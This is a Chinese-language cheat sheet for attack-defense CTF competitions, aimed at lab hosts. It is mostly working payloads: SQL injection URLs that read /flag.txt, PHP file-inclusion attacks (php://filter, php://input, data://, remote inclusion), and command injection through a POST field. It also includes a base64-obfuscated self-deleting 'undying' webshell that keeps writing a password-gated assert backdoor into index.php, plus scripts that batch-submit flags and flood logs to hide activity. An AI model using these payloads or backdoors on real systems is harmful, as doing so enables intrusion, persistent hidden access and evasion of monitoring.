## 常规漏洞 GET flag

#### SQL injection
```
http://172.16.2.234:8011/inject.php?id=1' and 1#
http://172.16.2.234:8011/inject.php?id=1 and 1#
http://172.16.2.234:8011/inject.php?id=1 order by 5#
http://172.16.2.234:8011/inject.php?id=1 order by 3#
http://172.16.2.234:8011/inject.php?id=1 order by 4#

http://172.16.2.234:8011/inject.php?id=-1 union select null# 
http://172.16.2.234:8011/inject.php?id=-1 union select null,null# 
http://172.16.2.234:8011/inject.php?id=-1 union select null,null,null# 

http://172.16.2.234:8011/inject.php?id=-1 union select null,@@version,null#
http://172.16.2.234:8011/inject.php?id=-1 union select null,null,load_file('/flag.txt')#
```

#### 文件包含

常见包含函数有：`include()、require()、include_once()、require_once()`
区别：

include是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行
require是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行
require一般是用于文件头包含类文件、数据库等等文件,include一般是用于包含html模版文件
`include_once()、require_once()`与(`include\require`)的功能相同,只是区别于当重复调用的时候，它只会调用一次。
```
<?php
include($_GET['filename']);    
?>
```

```
http://172.16.2.234:8011/include.php?filename=info.txt
http://172.16.2.234:8011/include.php?filename=file:///flag.txt

http://172.16.2.234:8011/include.php?filename=php://filter/convert.base64-encode/resource=/flag.txt
//读取到文件的base64编码，可用于读取php文件源码
echo "YmE2YzJkNDgzYjllZTQ5OWIwZjYxZjg4YmJlNGEzYzU="|base64 -d
ba6c2d483b9ee499b0f61f88bbe4a3c5
```
###### 下面的需要allow_url_include=On
```
//远程文件包含
http://172.16.2.234:8011/include.php?filename=[http|https|ftp|smb]://192.168.0.1/shell.txt //(需要allow_url_fopen=On并且 allow_url_include=On)

//php://input
http://172.16.2.234:8011/include.php?filename=php://input
POST: <?php echo file_get_contents("/flag.txt");?>

//data://
http://172.16.2.234:8011/include.php?filename=data://text/plain;base64,base64编码的php代码(不含结束标记?>)
echo '<?php echo file_get_contents("/flag.txt");'|base64
PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiL2ZsYWcudHh0Iik7Cg==
http://172.16.2.234:8011/include.php?filename=data://text/plain;base64,PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiL2ZsYWcudHh0Iik7Cg==
```

#### 命令执行注入
```
http://172.16.2.234:8011/list.php
POST:ipaddr=/tmp|ls -al

http://172.16.2.234:8011/list.php
POST:ipaddr=/tmp|cat /flag.txt

http://172.16.2.234:8011/list.php
POST:ipaddr=/tmp;cat /flag.txt

//& urlencode>%26
http://172.16.2.234:8011/list.php
POST:ipaddr=/tmp %26 cat /flag.txt
POST:ipaddr=/tmp %26%26 cat /flag.txt
```

## 常规漏洞写不死马

```
<?php
unlink($_SERVER['SCRIPT_FILENAME']);
ignore_user_abort(true);
set_time_limit(0);
$code=base64_decode("ZmlsZV9wdXRfY29udGVudHMoJ2luZGV4LnBocCcsJzw/cGhwICRhPSJhIi4icyIuInNlIi4icnQiO2lmIChtZDUoJF9QT1NUWzJdKT09PSIxMDk3MmQ3MThjMjFmZGM4NzE4ZWZiYWE4ZTY3NzQwZSIpeyRhKCRfUE9TVFsxXSk7fT8+JyxGSUxFX0FQUEVORCk7");
/*
file_put_contents('index.php','<?php $a="a"."s"."se"."rt";if (md5($_POST[2])==="10972d718c21fdc8718efbaa8e67740e"){$a($_POST[1]);}?>',FILE_APPEND);
*/
while(1){
  @eval($code);
  sleep(30); 
};
?>
```
加密：
```
PD9waHAKdW5saW5rKCRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXSk7Cmlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwpzZXRfdGltZV9saW1pdCgwKTsKJGNvZGU9YmFzZTY0X2RlY29kZSgiWm1sc1pWOXdkWFJmWTI5dWRHVnVkSE1vSjJsdVpHVjRMbkJvY0Njc0p6dy9jR2h3SUNSaFBTSmhJaTRpY3lJdUluTmxJaTRpY25RaU8ybG1JQ2h0WkRVb0pGOVFUMU5VV3pKZEtUMDlQU0l4TURrM01tUTNNVGhqTWpGbVpHTTROekU0WldaaVlXRTRaVFkzTnpRd1pTSXBleVJoS0NSZlVFOVRWRnN4WFNrN2ZUOCtKeXhHU1V4RlgwRlFVRVZPUkNrNyIpOwovKgpmaWxlX3B1dF9jb250ZW50cygnaW5kZXgucGhwJywnPD9waHAgJGE9ImEiLiJzIi4ic2UiLiJydCI7aWYgKG1kNSgkX1BPU1RbMl0pPT09IjEwOTcyZDcxOGMyMWZkYzg3MThlZmJhYThlNjc3NDBlIil7JGEoJF9QT1NUWzFdKTt9Pz4nLEZJTEVfQVBQRU5EKTsKKi8Kd2hpbGUoMSl7CiAgQGV2YWwoJGNvZGUpOwogIHNsZWVwKDMwKTsgCn07Cj8+
```
不死马加入到index.php的一句话木马：

```
//v5est0r
<?php $a="a"."s"."se"."rt";if (md5($_POST[2])==="10972d718c21fdc8718efbaa8e67740e"){$a($_POST[1]);}?>
POST: 2=v5est0r&1=system("ls -al")
```


##### 文件包含写不死

http://172.16.2.234:8011/include.php?filename=php://input

POST：
```
<?php file_put_contents("/var/www/html/s1.php",base64_decode("PD9waHAKdW5saW5rKCRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXSk7Cmlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwpzZXRfdGltZV9saW1pdCgwKTsKJGNvZGU9YmFzZTY0X2RlY29kZSgiWm1sc1pWOXdkWFJmWTI5dWRHVnVkSE1vSjJsdVpHVjRMbkJvY0Njc0p6dy9jR2h3SUNSaFBTSmhJaTRpY3lJdUluTmxJaTRpY25RaU8ybG1JQ2h0WkRVb0pGOVFUMU5VV3pKZEtUMDlQU0l4TURrM01tUTNNVGhqTWpGbVpHTTROekU0WldaaVlXRTRaVFkzTnpRd1pTSXBleVJoS0NSZlVFOVRWRnN4WFNrN2ZUOCtKeXhHU1V4RlgwRlFVRVZPUkNrNyIpOwovKgpmaWxlX3B1dF9jb250ZW50cygnaW5kZXgucGhwJywnPD9waHAgJGE9ImEiLiJzIi4ic2UiLiJydCI7aWYgKG1kNSgkX1BPU1RbMl0pPT09IjEwOTcyZDcxOGMyMWZkYzg3MThlZmJhYThlNjc3NDBlIil7JGEoJF9QT1NUWzFdKTt9Pz4nLEZJTEVfQVBQRU5EKTsKKi8Kd2hpbGUoMSl7CiAgQGV2YWwoJGNvZGUpOwogIHNsZWVwKDMwKTsgCn07Cj8+"));?>
```

然后访问根目录s1.php， http://172.16.2.234:8011/s1.php 即可追加一句话木马到index.php，循环往复。

```
curl http://172.16.2.234:8011/index.php --data "2=v5est0r&1=system('ls -al')"
```


### 对抗不死马
根据日志发现攻击日志。
```
while (true);do echo test >/var/www/html/shell.php;done &
```

## 批量提交flag
#### if题目要求只提交flag：
```
for i in `cat flag.txt`;do curl 172.16.2.234:8888/commit.php --data "myid=001&flag=$i" -s --cookie "PHPSESSID=fl51bmlkjhiblfttram3fg76n1";done
```
#### if题目要求提交ip和flag
```
root@kali:/# cat 1
aa,bb,cc
aa,bb,cc
aa,bb,cc
aa,bb,cc
aa,bb,cc
aa,bb,cc
aa,bb,cc
aa,bb,cc
aa,bb,cc
root@kali:/# cat 1|cut -d \, -f 2
bb
bb
bb
bb
bb
bb
bb
bb
bb
```
### 日志干扰法
```
while true;do curl --data "kdjwekk=dwddw" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0" http://172.16.2.234:8021/dvwa/vulnerabilities/fi/source/medium.php;curl --data "jkd=wfdwef" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0" http://172.16.2.234:8022/dvwa/vulnerabilities/fi/source/medium.php;echo 1;sleep 1;done 
```



